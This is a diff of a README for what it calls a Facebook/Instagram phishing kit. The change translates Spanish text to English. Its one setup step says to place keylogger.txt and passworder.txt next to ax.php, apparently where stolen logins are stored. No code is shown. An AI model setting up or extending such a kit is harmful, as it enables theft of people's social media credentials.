@@ -1,5 +1,5 @@
 # phishing-facebook-instagram
-Kit de phishing para facebook e instagram.
+Facebook/Instagram phishing kit
 
 <h2>How to use</h2>
-Crea los archivos keylogger.txt y passworder.txt y ponlos junto a ax.php
+Create files keylogger.txt and passworder.txt put them together with ax.php
